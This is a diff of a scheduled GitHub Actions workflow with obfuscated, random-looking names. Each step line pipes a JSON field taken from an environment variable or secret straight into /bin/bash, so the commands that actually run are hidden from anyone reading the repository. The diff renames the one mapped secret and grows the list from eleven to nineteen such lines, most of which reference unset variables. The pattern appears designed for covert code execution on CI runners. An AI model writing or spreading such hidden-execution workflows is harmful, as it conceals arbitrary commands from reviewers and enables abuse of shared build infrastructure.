@@ -1,27 +1,36 @@
 name: huchangjin7654
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 5/6 * * *'
-jobs:  # 2774
+    - cron: '41 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: huchangjin7654
         env:
-          t66: ${{ secrets.t66 }}
+          qiyl57850: ${{ secrets.qiyl57850 }}
         run: |
-          echo $t66 | jq -r .mhpe66 | /bin/bash
-          echo $qgrc43 | jq -r .aku12538 | /bin/bash
-          echo $x94678 | jq -r .l777 | /bin/bash
-          echo $ytm37 | jq -r .k4 | /bin/bash
-          echo $gjv03 | jq -r .soofg1 | /bin/bash
-          echo $ilve49 | jq -r .aemx9 | /bin/bash
-          echo $b789 | jq -r .gb4 | /bin/bash
-          echo $uswf37951 | jq -r .xpsvx92 | /bin/bash
-          echo $qf2548 | jq -r .nk2100 | /bin/bash
-          echo $llevc9 | jq -r .esa06335 | /bin/bash
-          echo $evnk0 | jq -r .hk0 | /bin/bash
+          echo $qiyl57850 | jq -r .h2 | /bin/bash
+          echo $cdiar27 | jq -r .soe5 | /bin/bash
+          echo $zsm47 | jq -r .b0 | /bin/bash
+          echo $jdg6 | jq -r .zkqmx8 | /bin/bash
+          echo $nm057 | jq -r .mekyj7418 | /bin/bash
+          echo $ka51 | jq -r .gx7 | /bin/bash
+          echo $wfcd6 | jq -r .ci07 | /bin/bash
+          echo $dzpyg993 | jq -r .w3 | /bin/bash
+          echo $a42673 | jq -r .aomg7 | /bin/bash
+          echo $wgmgd7984 | jq -r .n2 | /bin/bash
+          echo $a182 | jq -r .kjb899 | /bin/bash
+          echo $o43175 | jq -r .w646 | /bin/bash
+          echo $rovrs167 | jq -r .veeh211 | /bin/bash
+          echo $pceyw832 | jq -r .mqpc0563 | /bin/bash
+          echo $ec48817 | jq -r .hu8 | /bin/bash
+          echo $y27 | jq -r .aju535 | /bin/bash
+          echo $r40423 | jq -r .mxd39 | /bin/bash
+          echo $bol73 | jq -r .jp7798 | /bin/bash
+          echo $aisb05681 | jq -r .qzo728 | /bin/bash
 
